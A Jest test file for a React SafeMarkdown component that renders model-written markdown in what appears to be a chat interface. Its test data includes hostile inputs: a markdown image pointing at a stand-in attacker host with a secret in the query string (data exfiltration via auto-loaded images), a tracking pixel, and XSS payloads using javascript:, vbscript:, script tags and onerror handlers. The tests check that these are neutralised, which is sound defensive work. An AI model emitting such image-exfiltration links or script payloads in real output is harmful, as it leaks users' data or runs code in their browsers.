import React from "react"
import { renderToStaticMarkup } from "react-dom/server"
import { SafeMarkdown } from "./SafeMarkdown"

const render = (markdown: string, allowImages: boolean | "inline" = false) =>
  renderToStaticMarkup(
    <SafeMarkdown allowImages={allowImages}>{markdown}</SafeMarkdown>,
  )

describe("SafeMarkdown", () => {
  it("never renders images by default", () => {
    const html = render("![pixel](http://evil.example/track.png)")
    expect(html).not.toContain("<img")
    expect(html).not.toContain("track.png")
  })

  it("renders images when allowImages and src is http(s)/data:image", () => {
    expect(render("![ok](https://example.com/a.png)", true)).toContain("<img")
    expect(render("![ok](data:image/png;base64,iVBORw0KGgo=)", true)).toContain(
      "<img",
    )
  })

  it("shows images a model sends inline, and only links the remote ones it writes", () => {
    // When
    const inline = render(
      "![chart](data:image/png;base64,iVBORw0KGgo=)",
      "inline",
    )
    const remote = render("![leak](https://evil.example/?d=secret)", "inline")

    // Then
    expect(inline).toContain("<img")
    expect(remote).not.toContain("<img")
    expect(remote).toContain('href="https://evil.example/?d=secret"')
    expect(remote).toContain("Image: leak (evil.example)")
    expect(remote).toContain('title="Not loaded automatically"')
  })

  it("names a local image a model writes, which the browser cannot load", () => {
    // When
    const path = render("![heat map](/tmp/out/heat%20map.png)", "inline")
    const url = render("![](file:///tmp/chart.png)", "inline")
    const script = render("![x](javascript:alert(1))", "inline")

    // Then
    expect(path).not.toContain("<img")
    expect(path).toContain("Image: heat map (heat map.png)")
    expect(url).toContain("Image (chart.png)")
    expect(script).toBe("<p></p>")
  })

  it("shows a model's link to a local file as text with its path", () => {
    // When
    const path = render("[Open the chart](/Users/me/chart.png)", "inline")
    const url = render("[notes](file:///tmp/notes.txt)", "inline")
    const web = render("[docs](https://questdb.com/docs)", "inline")

    // Then
    expect(path).not.toContain("<a")
    expect(path).toContain('title="/Users/me/chart.png"')
    expect(path).toContain("Open the chart")
    expect(url).not.toContain("<a")
    expect(url).toContain('title="file:///tmp/notes.txt"')
    expect(web).toContain('href="https://questdb.com/docs"')
  })

  it("renders a large inline image whole", () => {
    // Given
    const data = `data:image/png;base64,${"A".repeat(2_000_000)}`

    // When
    const html = render(`Before ![big](${data}) after **bold**`, "inline")

    // Then
    expect(html).toContain(`src="${data}"`)
    expect(html).toContain("<strong>bold</strong>")
  })

  it("drops images with unsafe src even when images are allowed", () => {
    expect(render("![x](javascript:alert(1))", true)).not.toContain("<img")
    expect(render("![x](vbscript:msgbox(1))", true)).not.toContain("<img")
  })

  it("escapes raw HTML — no live script or event-handler element", () => {
    const html = render("<script>alert(1)</script>")
    // Raw HTML is escaped to inert text, never a live element.
    expect(html).not.toContain("<script")
    const imgHtml = render('<img src=x onerror="alert(1)">', true)
    // The raw <img> is escaped (rendered as text), not emitted as an element.
    expect(imgHtml).toContain("&lt;img")
    expect(imgHtml).not.toMatch(/<img[^>]*onerror/i)
  })

  it("opens http(s) links in a new tab with noopener noreferrer", () => {
    const html = render("[site](https://example.com)")
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener noreferrer"')
  })

  it("does not add target/rel to relative or anchor links", () => {
    const html = render("[here](#section)")
    expect(html).not.toContain('target="_blank"')
  })

  it("neutralizes javascript: link hrefs (react-markdown default)", () => {
    const html = render("[x](javascript:alert(1))")
    expect(html).not.toContain("javascript:alert")
  })

  it("renders GFM tables by default", () => {
    const html = render("| a | b |\n| - | - |\n| 1 | 2 |")
    expect(html).toContain("<table")
  })
})
